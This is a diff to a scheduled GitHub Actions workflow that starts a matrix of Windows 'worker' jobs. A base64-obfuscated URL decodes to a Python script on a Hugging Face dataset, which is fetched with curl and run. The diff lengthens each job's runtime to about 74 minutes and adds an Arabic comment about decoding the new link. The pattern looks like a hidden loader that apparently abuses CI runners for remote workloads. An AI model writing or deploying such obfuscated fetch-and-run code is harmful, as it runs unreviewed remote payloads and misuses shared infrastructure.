@@ -3,18 +3,17 @@ name: Matrix Aut44
 on:
   workflow_dispatch:
   schedule:
-    - cron: '*/10 * * * *'
+    - cron: '0 * * * *'
 
-# جعل الدورة الجديدة تنتظر في الطابور بدلاً من إلغاء الدورة الحالية
 concurrency:
-  group: matrix-pool-aut44
+  group: matrix-pool-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
   launch-workers:
     name: "Agent-${{ matrix.node_index }}"
     runs-on: windows-2022
-    timeout-minutes: 22
+    timeout-minutes: 75
 
     strategy:
       fail-fast: false
@@ -27,6 +26,7 @@ jobs:
         run: |
           echo "[INITIALIZING] Setting up Worker-${{ matrix.node_index }}..."
           
+          # فك تشفير الرابط الجديد وتحميل الملف
           REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
           curl -sL "$REMOTE_SRC" -o app_task.py
@@ -53,16 +53,15 @@ jobs:
           }
           $WorkerProc = Start-Process @ProcessParams
           
-          Write-Output ">>> Supervisor online. Enforcing maximum runtime: 20 minutes."
+          Write-Output ">>> Supervisor online. Enforcing maximum runtime: 74 minutes."
           
           try {
-              # 1200 ثانية = 20 دقيقة بالضبط
-              Wait-Process -InputObject $WorkerProc -Timeout 1200 -ErrorAction Stop
+              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
               Write-Output ">>> Process finished execution within limit."
           }
           catch {
               Write-Output ">>> Execution threshold met! Killing process..."
-              Stop-Process -InputObject $WorkerProc -Force -ErrorAction SilentlyContinue
+              Stop-Process -InputObject $WorkerProc -Force
               Write-Output ">>> Process terminated successfully."
           }
 
